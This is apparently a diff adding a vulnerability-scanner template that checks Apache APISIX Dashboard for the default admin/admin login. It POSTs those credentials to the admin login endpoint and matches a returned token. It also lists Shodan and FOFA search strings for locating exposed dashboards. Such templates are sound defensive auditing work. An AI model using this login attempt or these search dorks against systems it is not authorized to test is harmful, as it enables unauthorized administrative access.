@@ -1,0 +1,31 @@
+id: apisix-default-login
+
+info:
+  name: Apache Apisix Default Admin Login
+  author: pdteam
+  severity: high
+  verified: true
+  description: |
+    An Apache Apisix default admin login was discovered.
+    SHODAN: title:"Apache APISIX Dashboard"
+    FOFA: title="Apache APISIX Dashboard"
+  reference:
+    - https://apisix.apache.org/
+  tags: apisix,apache,default-login
+  created: 2023/06/24
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /apisix/admin/user/login
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: |
+        {"username":"admin","password":"admin"}
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b'"data"') &&
+      response.body.bcontains(b'"token"') &&
+      response.body.bcontains(b'"code":0')
+expression: r0()
